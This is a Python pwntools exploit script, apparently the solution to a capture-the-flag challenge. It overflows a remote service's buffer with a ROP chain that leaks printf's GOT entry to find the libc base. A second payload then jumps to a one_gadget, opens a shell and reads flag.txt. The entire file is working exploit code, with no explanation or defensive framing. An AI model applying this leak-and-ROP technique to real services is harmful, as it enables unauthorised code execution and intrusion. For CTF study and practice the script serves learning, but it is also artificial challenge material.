#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv("CTF4B_HOST", "0.0.0.0")
PORT = int(os.getenv("CTF4B_PORT", "9003"))

binfile = "./chall"
context.log_level = "critical"
e = ELF(binfile)
libc = ELF("libc.so.6")
context.binary = binfile

io = remote(HOST, PORT)

one_gadgets = [0xEBCF1, 0xEBCF5, 0xEBCF8]

pad = b"a" * 0x20 + pack(e.got["printf"] + 0x20)

rop = ROP(e)
rop.raw(rop.find_gadget(["pop rdi", "ret"]))
rop.raw(pack(e.got["printf"]))  # printf arg for leak
rop.raw(rop.find_gadget(["pop rbp", "ret"]))
rop.raw(pack(e.bss() + 0x400))
rop.call(pack(0x401171))  # mov rax, 0 ; call printf
rop.call(pack(e.sym["main"]))

payload = pad + rop.chain()

io.sendlineafter(b"content: ", payload)

leaked = unpack(io.recv(8).ljust(8, b"\0"))
libc_base = leaked - libc.sym["printf"]

pad = b"a" * 0x20
payload = pad + pack(e.bss() + 0x500)
payload += pack(libc_base + 0x000000000002BE51)  # pop rsi ; ret
payload += pack(0)
payload += pack(libc_base + 0x000000000011F497)  # pop rdx ; pop r12 ; ret
payload += pack(0)
payload += pack(0)
payload += pack(libc_base + one_gadgets[2])

io.sendline(payload)

io.sendline(b"echo shell")
io.recvuntil(b"shell\n")
io.sendline(b"cat flag.txt")
print(io.readline().decode(), end="")
